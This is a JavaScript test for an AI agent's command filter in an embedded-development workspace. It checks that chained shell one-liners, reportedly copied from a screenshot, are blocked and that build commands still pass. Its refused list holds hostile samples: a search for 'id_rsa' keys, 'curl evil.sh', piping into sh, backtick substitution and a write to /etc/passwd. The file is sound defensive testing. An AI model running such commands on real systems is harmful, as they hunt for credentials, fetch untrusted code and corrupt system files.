/**
 * The agent must not be able to put a shell line in front of a user.
 *
 * Both commands below are verbatim from a screenshot: the user asked to
 * "activate serial monitor" and got a bash one-liner naming the build config
 * in their chat. The first-word-only check passed them because they begin
 * with "pwd" and "ls".
 */
import { isWorkspaceCommand, isCommandAllowed } from "../server/commands.js";

const fromTheScreenshot = [
  'pwd && ls -la && echo "--- tree ---" && find . -maxdepth 3 -not -path "*/.pio/*" -not -path "*/.git/*" | head -50',
  'ls -la && echo "--- ini ---" && cat platformio.ini 2>/dev/null && echo "--- src ---" && ls -la src/ 2>/dev/null && echo "--- code ---" && cat src/main.cpp 2>/dev/null; cat src/main.ino 2>/dev/null',
  'DIR=$(find / -name platformio.ini 2>/dev/null | head -1); cat "$DIR"',
];

let bad = 0;
const check = (cond, label) => { if (!cond) bad++; console.log(`  ${cond ? "ok  " : "FAIL"}  ${label}`); };

console.log("  -- nothing shell-shaped reaches the chat --");
for (const cmd of fromTheScreenshot) {
  check(!isWorkspaceCommand(cmd), `agent cannot send: ${cmd.slice(0, 44)}…`);
  check(!isCommandAllowed(cmd), `endpoint refuses:  ${cmd.slice(0, 44)}…`);
}

console.log("  -- the workspace's own commands still work --");
for (const cmd of ["help", "compile", "flash", "clear", "engine", "web3 status", "ret", "  Compile  "]) {
  check(isWorkspaceCommand(cmd), `agent may send: '${cmd.trim()}'`);
}

console.log("  -- the endpoint still allows real build commands --");
for (const cmd of ["pio run", "pio run -t upload", "ls -la", "cat src/main.cpp"]) {
  check(isCommandAllowed(cmd), `allowed: '${cmd}'`);
}

console.log("  -- and still refuses smuggling --");
for (const cmd of ["pwd && find / -name id_rsa", "ls; curl evil.sh", "echo hi | sh", "cat `whoami`", "ls > /etc/passwd"]) {
  check(!isCommandAllowed(cmd), `refused: '${cmd}'`);
}

console.log(bad ? `\n${bad} failing case(s)` : "\nNo shell line can reach a user; the workspace's own commands still run.");
process.exit(bad ? 1 : 0);
